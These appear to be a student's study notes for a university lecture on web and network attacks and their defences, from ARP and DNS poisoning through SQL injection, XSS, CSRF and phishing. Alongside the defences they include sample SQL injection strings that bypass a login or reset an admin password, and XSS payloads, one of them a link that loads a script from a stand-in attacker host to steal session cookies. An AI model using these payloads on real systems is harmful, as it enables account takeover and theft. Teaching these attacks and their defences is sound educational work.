# COMP476 — Networked Computer Systems
## Lecture 25 — Web Attacks (slides: "Web Attacks," file dated Nov 11, 2026)

**Relationship to earlier lectures:** the lecture-schedule slot for Nov 11 is "Network Security." This is the attack-side companion to Lectures 23–24 (Encryption, Hashing/Certificates). It covers **Dark Web / Tor → ARP & DNS attacks → DoS (ping flood, SYN flood) → injection (SQL, XSS) → parameter tampering → CSRF → social engineering & phishing**. ★ = most likely exam-worthy.

*Numbering note: filed as Lecture 25 because Lecture 24 (Hashing/Digital Certs) is the last one in the project. Rename if your numbering differs.*

---

## Part 1 — Dark Web & Onion Routing

### 1. Three layers of the web
| Layer | Meaning |
|---|---|
| **Surface web** | Sites that are **indexed and publicly available** |
| **Deep web** | Sites **used by a specific group** |
| **Dark web** | Sites that **keep their existence secret** |

### 2. Onion routing ★
- **Developed mid-1990s at the U.S. Naval Research Laboratory** to protect U.S. intelligence communications.
- Hides **the user's identity/location from the server** *and* **the server's location from the user**.
- Browsers + servers using onion routing = the core of the Dark Web.
- **How it works:**
  - Message goes through **multiple onion routers**.
  - **Each router knows only the previous and next router.**
  - **First router knows the source; last router knows the destination.**
  - Message is **encrypted with each router's public key**; the **message contents + next-router address** are encrypted by that router's key (layers — hence "onion").
  - Routers create a **virtual circuit** from source to destination.
  - **TLS can be used in addition.**

### 3. Onion sites / Tor
- Use the **`.onion`** top-level domain (instead of .com/.net/.gov).
- Use **The Onion Router (Tor)** software to encrypt connections and allow anonymous communication; **hide location, ownership, other identifiers**.
- Directory example on slides: **thehiddenwiki.com**.
- **Using Tor:** download the **Tor browser** (torproject.org/download), connect to the onion network, and if a site is available on both open and dark web, **select "onion always."**
- ⚠️ **Be careful:** dark web has sites selling **drugs, fake IDs, weapons** — instructor: *do NOT get yourself in trouble.*

---

## Part 2 — Network-Layer Attacks

### 4. ARP (Address Resolution Protocol) ★
- Finds the **MAC (physical) address** of another computer **on the same local network**.
- **Process:** ARP **broadcasts a request containing the desired IP address** to everyone on the LAN → all compare it to their own → **only the matching computer replies**.

### 5. ARP poisoning ★
- A malicious system **sends a false ARP reply** giving an **incorrect MAC for an IP**.
- Victim sends packets to the **attacker's computer**, thinking they're going to the real IP.

**Defenses ★**
- **Static, read-only ARP cache entries** for critical services.
- **Check MAC addresses against the DHCP server.**
- **SEND (Secure Neighbor Discovery)** in **IPv6** — uses **encryption and certificates**.

### 6. Random MAC addresses
- Per **Edward Snowden**, the **NSA** has a system tracking **mobile devices' movements in a city by their MAC addresses**.
- Many systems now use a **random wireless MAC**.
- Some intentional tracking systems use a **hash of the MAC** for anonymity.

### 7. DNS & DNS attacks ★
- **DNS servers** hold a database of **names ↔ IP addresses**; provided by the **network owner** (company or ISP). If a server doesn't know the answer, it **asks another server**.
- **Original design had no security.** An attacker **masquerading as a DNS server** can feed other DNS servers false data = **cache poisoning** → users get sent to **malicious websites**.
- **Defense: DNSSEC** — **digital signatures** giving **cryptographic authentication of data, authenticated denial of existence, and data integrity**.

---

## Part 3 — Denial of Service (DoS) ★

### 8. Definitions
- **DoS:** attempt to make a computer resource **unavailable to its intended users**. **DDoS (Distributed):** attack using **a large number of computers**. Basically "crashing" the system so others can't use it.

### 9. CERT-listed symptoms
- **Unusually slow network performance** (opening files, accessing sites)
- **Unavailability of a particular website**
- **Inability to access any website**
- **Dramatic increase in spam** (an **e-mail bomb**)

### 10. Ping flood ★
- Attacker **broadcasts an ICMP echo packet to all computers on a network** with the **return (source) address spoofed to the victim's address**.
- **Every computer replies with an ICMP echo-reply to the victim** → huge volume **consumes the victim's network resources**.
- *(Aside: this amplification style is commonly called a "smurf" attack — not named on the slides.)*
- **Mitigation:** a computer **should not accept an ICMP echo sent to a broadcast address**; many **firewalls (including A&T's) block ICMP echo**.

### 11. SYN flood ★★
- Recall **TCP's three-message handshake** (SYN → SYN-ACK → ACK) before data is exchanged.
- **Attack:** send **many SYN packets**, **never send the final ACK** → **half-open connections** tie up resources until the victim **times out**; legitimate users **can't connect**.
- **Details:**
  - A **TCP port is 16 bits → ~64K (65,536) values**; once all are used, **no further connections** can be established.
  - Server **must save state for each half-open connection**.
  - The **return address is typically a non-existent or non-functioning computer** (so the handshake never completes).
- **Mitigations ★:**
  1. **Decrease the timeout** waiting for the ACK
  2. **Filter packets with obviously incorrect source addresses**
  3. **Minimize info saved from the SYN message**
  4. **Increase memory** available for connection info

---

## Part 4 — Untrusted Data & Injection ★★

### 12. Untrusted data
- **Many web attacks come from untrusted data.** Source = **outside the application**: usually **user input**, but also **cookies or databases**.
- **Always treat untrusted data as if it contains an attack.**
- It can **flow through an app, split and recombined with trusted data.**
- **Injection attacks target parsers**, tricking them into **interpreting data as commands.**

### 13. HTML data display (setup for XSS)
```html
<p id="thing">Mom and apple pie</p>
<script>
document.getElementById("thing").innerHTML = "<em>Evil</em> and corruption";
</script>
```
- JavaScript can change the text via **innerHTML**; **any JavaScript in the replacement text could be executed.**

---

## Part 5 — SQL Injection ★★

### 14. Vulnerable pattern
```php
$name = $HTTP_POST_VARS["name"];
$query = "select * from results where name = '". $name ."';";
$result = mysql_query($query);
```
- **Login example:** table `login(username, password)`:
```php
$query = "select * from login where username = '" . $name . "' and password = '" . $pwd . "'";
if ($result->num_rows > 0) // allow access
```
- Normal query: `select * from login where username = 'KenW' and password = 'Secret'`

### 15. Attack 1 — always-true condition ★
- Set **password = `x' or 'a' = 'a`** →
```sql
select * from login where username = 'alice' and password = 'x' or 'a' = 'a';
```
- `'a' = 'a'` is **always true** → logs in. **The username doesn't even need to exist in the database.**

### 16. Attack 2 — piggy-backed command ★
- Set **password = `x'; update login set password = 'mySecret' where username = 'admin`** →
```sql
select count(*) from login where username = 'alice' and password = 'x';
update login set password = 'mySecret' where username = 'admin';
```
- The **`'` closes the string, `;` ends the statement**, then the attacker's **second statement runs** → **changes the admin's password.**

### 17. Defense: parameterized (prepared) statements ★★
```php
$goat = new mysqli( ... );
$dog  = "select from login where name = ? and course = ?";
$cat  = $goat->prepare($dog);
$cat->bind_param("ss", $student, $class);
$cat->execute();
```
- Query takes **data values from variables via `?` placeholders**; data is **never parsed as SQL**.
- **`"ss"` = two string parameters.**
- **Error checking omitted in the slide — always check return codes.**
- **Golden rule: never, ever concatenate user data to build a database query.** Prepared statements are **safer and more efficient.**

---

## Part 6 — Cross-Site Scripting (XSS) ★★

### 18. What it is
- **Browser executes untrusted data.** **One of the most prevalent attacks.** Past victims: **X (Twitter), Facebook, MySpace, YouTube, Orkut.**
- A page mixes **text, formatting, and script**; XSS makes the browser **interpret text as script.**

### 19. Reflected example (3 parts) ★
1. Client script asks the user's name → sends to server: `https://example.com/myapp.php?user=Ken` (HTTP headers + cookie may also go).
2. Server **reflects** the name back: `<p>Hello Ken</p>`
3. User instead enters `<script>alert('Got you');</script>` → **the script runs** when the page displays it.

### 20. Vulnerable JavaScript
```html
function showName() {
  var userin = document.getElementById("instuff").value;
  document.write("Hello " + userin);   // writes untrusted input straight into the page
}
```

### 21. Defense: Constraint Validation API (HTML5) ★
- Constrain input fields: **min/max/step for `type="number"`**, **URL / email types**, and for text a **regex `pattern`**.
- Helps **user errors and security**. **Validation is not automatic** — you must **test it**.
- **`element.checkValidity()`** — if invalid, **fires an `invalid` event and returns false**; otherwise true.
- **`element.reportValidity()`** — like checkValidity **but also displays an error message.**
- Example: `<input ... pattern="[A-Z a-z]+" />` + `if (inputField.reportValidity()) {...} else {"Bad input"}` → only letters/spaces accepted, so `<script>` is rejected.
- *(Also: real defense is **HTML-encoding output**; client-side validation alone can be bypassed.)*

### 22. "Aren't I just attacking myself?"
- Entering script in your own field only hurts you — **but the attacker gets *other* people to submit it** (types below).

### 23. Three types of XSS ★★
| Type | Key points |
|---|---|
| **Non-persistent (Reflected)** | **Most common.** Untrusted data displayed **without HTML encoding**. Search engines echo your query verbatim. Attacker emails a **link**: `acme.com/search?q=<script>bad stuff</script>`; server replies with the query → **script executes in the victim's browser**, can **steal data from acme.com**. |
| **Persistent (Stored)** | **More devastating.** Data is **stored on the server** and **later shown to users without encoding** (e.g., **message board posts**). Scripts run **repeatedly**, can hit **many users**, can spread as an **XSS virus/worm**. |
| **DOM-based (Local)** | Problem is **in the page's own JavaScript**. Injected script can **change data such as cookies**. Can be **persistent or non-persistent**. |

### 24. Reflected XSS worked example (Wikipedia) ★
- **Carol** knows **Alice** uses **bobsite**. She crafts:
  `http://bobsite.org/search?q=puppies<script src="http://myevilsite.com/authstealer.js"></script>`
- Emails it to Alice titled **"Cute Puppies."** Alice clicks **while logged in** → **authstealer.js sends Alice's cookie to Carol** → **Carol logs into bobsite as Alice.**

### 25. Why XSS persists
- **Complex problem, not going away soon.** **The browser is insecure by design — it understands JavaScript.** **Disabling scripting seriously damages the browsing experience.**

---

## Part 7 — Parameter Tampering & Information Leaks ★

### 26. Parameter tampering
- Some apps pass **critical data between browser and server**; changing it can cause an exploit. A **proxy between browser and server** can **view and edit HTTP requests**.
- **Example:** `http://www.books.com/add.aspx?bookID=8784&qty=1&price=59.95` → user edits **price** and **pays much less**.
- **Fix:** **don't trust user input; look up the price in the database** server-side.

### 27. Releasing too much information ★
| Problem | Example | Fix |
|---|---|---|
| **Guessable IDs** | Order page `order.aspx?ordernum=2457` → try **2458, 2456…** to see **other people's orders** | **Verify the order belongs to the logged-in user** (authorization check) |
| **Guessable filenames** | If HW2 solutions are `comp476.online/HW2sol.pdf`, **HW3 solutions are probably `HW3sol.pdf`** — works **even with no link** | Use **long random names** |
| **Hidden form parameters** | `<input type="hidden" id="admin" />` — hidden fields are **still in the HTML, which users can view and modify** | **Never keep secrets/privileges in HTML**; keep them server-side |
| **HTML comments** | Developers comment out code or leave **test credentials** (slide: test user "tester" with password "badchoice") | **Strip comments/credentials from production pages** |

*(Slide's comment syntax shows `<! ... />`; real HTML comments are `<!-- ... -->`.)*

---

## Part 8 — Cross-Site Request Forgery (CSRF) ★★

### 28. Definition
- Also called **one-click attack** or **session riding**; abbreviated **CSRF / XSRF** ("sea-surf").
- **Unauthorized commands are submitted from a user the web app trusts.**
- **Contrast ★:** **XSS exploits the trust a *user* has in a site; CSRF exploits the trust a *site* has in a user's browser.**

### 29. General concept
- When you log in, your **browser receives a cookie saying you're logged in.**
- If you then visit **another site in a different tab, open an email, or get malicious input**, the browser may **send a request to the original site** — **and the request automatically includes your login cookie.**

---

## Part 9 — Misleading Links & Social Engineering

### 30. Misleading links ★
- A link has **both a URL and display text** — they **don't have to match.** Text may say `www.warmandfuzzy.com` while the link goes to `www.spidersandsnakes.com`.
- `<a href="http://www.evil.com">www.nice.com</a>` displays as **www.nice.com**.
- **Check the preview in the lower-left of the browser** — **most phone browsers don't offer this.**

### 31. Misleading QR codes
- Attacker **sticks a malicious QR code over a restaurant menu's real one** → scanner is sent to the **attacker's website**. **Always check the displayed link before clicking.**

### 32. Social engineering ★
- **Manipulating people into performing actions or divulging confidential info**, rather than breaking in technically. Similar to a **confidence trick / simple fraud.**
- **Users make bad decisions:** many **OK anything**, many have **insecure passwords**, most **don't know how to protect their computer**.

---

## Part 10 — Phishing ★★

### 33. Definition & types
- **Phishing:** fraudulently trying to **acquire sensitive info by masquerading as a trustworthy entity.**

| Type | Definition |
|---|---|
| **Spear phishing** | **Targeted at specific individuals or companies** |
| **Whaling** | Aimed at **senior executives and other high-profile targets** |
| **Clone phishing** | A **legitimate email whose attachment/link was replaced with malware**, often sent from a **spoofed return address of the original sender** |
| **SMS phishing ("smishing")** | **Text message** directing victim to call a number/resolve an issue. **Mar 9, 2012:** mass scam texts offering a **nonexistent $1,000 gift card** |
| **Phone (vishing-style)** | Caller **poses as your bank** and asks for information |

### 34. Effectiveness (Dashlane stats on slide) ★
- **95%** of attacks on enterprise networks result from **successful spear phishing**.
- Phishing attempts **grew 65%** in the last year.
- **76%** of businesses were **victims** in the last year.
- **30%** of phishing messages **get opened**; **12%** of those users **click** the malicious attachment/link.
- **~1.5 million new phishing sites per month.**

### 35. On social networks
- **Prime target** because personal details enable **identity theft**.
- **Late 2006: a worm took over MySpace pages** and altered links to **credential-stealing sites**.
- Experiments: **>70% success** for phishing on social networks.

### 36. History timeline
- **1987** — technique described in a paper to the **International HP Users Group, Interex**
- **Mid-1990s** — attacks against **AOL**
- **Sept 2003** — **first known phishing attack on a retail bank**
- **May 2017** — **WannaCry** ransomware, suspected to have impacted **>230,000 people in 150 countries** *(ransomware rather than classic phishing — slide lists it for context)*

### 37. Email phishing examples
- **Nigerian banker ("advance-fee") scam:** inherited **$40 million**, offers **10%** for help transferring → asks for your **account number**.
- **"First National Bank" security update:** asks you to **reply with account number and password** or lose access. *(Banks never ask this.)*
- **More convincing real example:** fake **"Exchange Server Mailbox Manager"** cleanup notice, **CLICK HERE** link, signed **WEBMAIL MANAGEMENT TEAM** — actual link went to **vizzualforms.com**, a generic form site, not the school.
- **Tells:** urgency/threat of lost access, generic sender, link domain doesn't match the claimed organization, request for credentials.

### 38. Microsoft Office 365 ATP Safe Links ★
- **Used at A&T** to check links in **faculty/staff** email. Part of **Microsoft Advanced Threat Protection (ATP)**.
- When email reaches the **Exchange server, links are rewritten to point to a Microsoft Safe Links server**. If the site is judged **safe → redirects you** to it. If on a **suspected list → error message** shown.

---

## Part 11 — Website Forgery & Related Tricks ★

### 39. Website forgery
- **Easy to copy a real site's content** onto a fake site.
- **A fake site with a digital certificate still validates under HTTPS** — **HTTPS only proves encryption + domain ownership, not trustworthiness** *(links back to Lecture 24 certificates).*
- **Look-alike names:** `www.trusted.evil.com` is really a site under **evil.com**, not trusted.com.

### 40. Man-in-the-middle phishing
- Fake site **forwards all traffic to the real site after recording accounts and passwords.**
- **Universal Man-in-the-Middle Phishing Kit** (found by **RSA Security**): easy interface to **reproduce sites and capture logins.**

### 41. XSS phishing
- Script placed in content shown to other users **redirects them to a look-alike malicious site.** Since the user **started at the legitimate site, they believe they're still on it.** Info entered can even be **passed on to the real site** so nothing looks wrong.

### 42. Countering phishing
- Approaches: **legislation, user training, public awareness, technical measures.** **User education is the primary solution.**

### 43. Filter evasion
- Message placed **inside an image** — humans read it, **scanners often don't.** Some filters use **OCR**.
- **"Phlashing"** — hiding phishing text using **Flash**.

### 44. Click-through syndrome ★
- Users **allow a dangerous action because it seems necessary to make the activity work.** **Worsened by honest sites with certificate problems** (they train users to click past warnings).

---

## Part 12 — Course Logistics (end of slides)

- **Phishing assignment** (last one, on Canvas): **Part 1** — log into a site requiring a password. **Part 2** — **send the instructor a convincing phishing email.** **Nothing uploaded to Canvas.** **Due before Exam 3 — 6:00 pm, Wed Nov 18, 2026.**
- **Practice exam:** last year's **Exam 3** is on **Canvas → Files → Solutions and Information.**

| Date | Topic | Reading |
|---|---|---|
| **Wed Nov 11** | Network Security | **5.12** |
| **Mon Nov 16 (online only)** | Firewalls & review | **8.3** |
| **Wed Nov 18** | **Exam 3** | |
| **Mon Nov 23** | Backups | |
| **Wed Nov 25** | Thanksgiving — no classes | |
| **Mon Nov 30** | Gestalt | |
| **Wed Dec 2** | Final review | |

- ⚠️ **Today is Wed Nov 18 — Exam 3 day, and the phishing assignment is due at 6:00 pm.**

---

## Quick fact sheet ★
| Concept | Key fact |
|---|---|
| Surface / Deep / Dark web | **Indexed+public** / **specific group** / **existence secret** |
| Onion routing | **U.S. Naval Research Lab, mid-1990s**; **each router knows only prev/next**; layered public-key encryption; **.onion**, **Tor** |
| ARP | **Broadcast IP → get MAC**, same LAN only |
| ARP poisoning | **Fake ARP reply** with wrong MAC → traffic goes to attacker. Defenses: **static ARP entries, check vs DHCP, SEND (IPv6)** |
| DNS attack | **Cache poisoning** → malicious sites. Defense: **DNSSEC (digital signatures)** |
| DoS vs DDoS | One source vs **many computers** |
| Ping flood | **Spoofed source = victim**, broadcast **ICMP echo** → everyone replies to victim. Fix: **drop broadcast echo / firewall ICMP** |
| SYN flood | **SYN with no ACK**, **half-open connections**, **64K ports**. Fix: **shorter timeout, filter bad sources, store less, more memory** |
| SQL injection | **Concatenated user input becomes SQL.** `x' or 'a'='a` = always true. Fix: **parameterized statements** |
| XSS | **Browser runs untrusted data as script.** Types: **reflected (most common), stored (worst), DOM-based** |
| XSS defense | **HTML-encode output; validate input (checkValidity / reportValidity, `pattern`)** |
| XSS vs CSRF | XSS = **user's trust in site**; CSRF = **site's trust in user's browser (cookie auto-sent)** |
| Parameter tampering | **Edit URL/form values (price!)**; fix: **server looks up trusted values** |
| Info leaks | **Guessable order #s / filenames, hidden fields, HTML comments** |
| Phishing types | **Spear (targeted), whaling (execs), clone (swapped link), smishing (SMS)** |
| Phishing stats | **95%** enterprise attacks via spear phishing; **30% open, 12% of those click** |
| Safe Links | **Microsoft ATP** — rewrites email links through a checking server (used at A&T) |
| HTTPS ≠ safe | **Fake sites can have valid certificates** |
| Phlashing | Phishing text hidden in **Flash** |
| Click-through syndrome | Users **click past warnings** to make things work |

---

## Slide errata / cautions (flagged, not changed above unless noted)
- **Parameterized-statement slide** has `select from login …` — **missing the column list/`*`** — and uses joke variable names (`$goat`, `$dog`, `$cat`); read them as **connection, query string, prepared statement**.
- **SQL injection slide** shows `... username = ' . $username . ' ...` with stray quote/concatenation characters; the intent is the same string-concatenation vulnerability as the login code.
- **PHP `$HTTP_POST_VARS` and `mysql_query`** are **deprecated/removed** in modern PHP (use `$_POST`, `mysqli`/PDO) — fine for understanding the concept.
- **XSS slide:** the Constraint Validation fix **only helps client-side**; attackers can bypass the browser entirely, so servers must also **validate and HTML-encode**. Lecture frames it as a useful first defense.
- **HTML comment slide** uses `<! ... />` — **not valid HTML comment syntax.**
- **WannaCry** under "History of Phishing" is **ransomware** (spread via an SMB exploit), not a phishing attack per se.
- **Phishing stats** are from a **Dashlane blog** — vendor figures, quoted as given.
- **ICMP flood amplification** is commonly named a **"smurf" attack** — my addition, not on the slides.
- **Diagram/screenshot-only slides** (XKCD, ARP diagram, TCP handshake figure, SYN flood figure, XSS result screenshot, bookstore app screenshot, QR-code and phishing-email images) are **described in words** where the text gave enough context.
